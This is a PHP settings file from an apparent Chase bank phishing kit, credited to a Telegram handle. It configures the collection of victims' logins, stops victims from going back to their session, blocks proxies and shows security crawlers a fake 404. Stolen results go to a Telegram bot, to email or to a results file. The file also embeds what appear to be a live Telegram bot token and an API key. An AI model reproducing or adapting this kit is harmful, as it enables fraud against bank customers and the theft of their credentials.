<?php
defined('ABSPATH') or exit('Cheeky huh?!?!');
/*


								 ██████╗██╗  ██╗ █████╗ ███████╗███████╗™
								██╔════╝██║  ██║██╔══██╗██╔════╝██╔════╝
								██║     ███████║███████║███████╗█████╗
								██║     ██╔══██║██╔══██║╚════██║██╔══╝
								╚██████╗██║  ██║██║  ██║███████║███████╗
								 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
								      	 ___ ___     ___     ___   ___ ___
								┌┐ ┬ ┬	|  _| | |___|_  |___|_  | |   |   |
								├┴┐└┬┘	|  _|_  |  _|_  |  _|_| |_| | | | |
								└─┘ ┴ 	|_|   |_|___|___|_| |_____|___|___|


Make sure you setup correct shit.

1 = enabled
0 = disabled

Telegram bot url and chat id are required if you change telegram to 1.

If you want Telegram Bot Message me on Telegram : @f4c3r100

*/

$settings = array(
	"log_user"		=> 1,	// Log User-Agent, IP and Date
	"phone_lookup"	=> "1",	// Phone API Lookup
	"print_match"	=> "0",	// Just For Debug
	"anti-back"		=> "1",	// Victim Can't Go Back To Session
	"debug"			=> 0,	// Print Errors
	"proxy_block"	=> "1",	// Detect Proxies & Block Them
	"send_mail"		=> "0",	// Send E-Mail To Your Mail
	"save_results"	=> "1",	// Save Results
	"telegram"		=> "0",	// Telegram Bots Receiver
	"double_login"	=> "0", // Double Login
	"background"	=> "background2", // day (background1) or night (background2) to customize chase
	"chat_id"		=> "828913072",	// Chat ID Of You
	"bot_url"		=> "bot1535489746:AAH4dCVJlvMejpymKtkk8yc7lcrLZin53AQ",	// Your Bot API Key
	"api"			=> "9f9fc57d831da97dbb893f946d8e148a",	// API Key Numerify.com
	"referer"		=> "https://live.com/",	// HTTP Referer For Antibots
	"out"			=> "404 Error",	// Outcome Of AntiBots Forward (Google search) - DONT CHANGE
	"email"			=> "your@gmail.com",	// Your E-Mail
);
//return $settings;

/*

							*** OTHER NOTES ***

			* LOG FILES DATE|IP|USERAGENT 	==> Logs/logs.txt
			* BLOCKED PROXIES FILE 			==> Logs/proxy-block.txt
			* RESULTS FILE 					==> Logs/results.txt
			* BLACKLIST FILE 				==> login/Bots/blacklist.dat
			* WHITELIST FILE 				==> login/Bots/whitelist.dat

			/!\ DO NOT CHANGE CLIENT.TXT | TEMP.TXT | CAPTURED.TXT /!\


							TELEGRAM : @F4C3R100


*/

?>
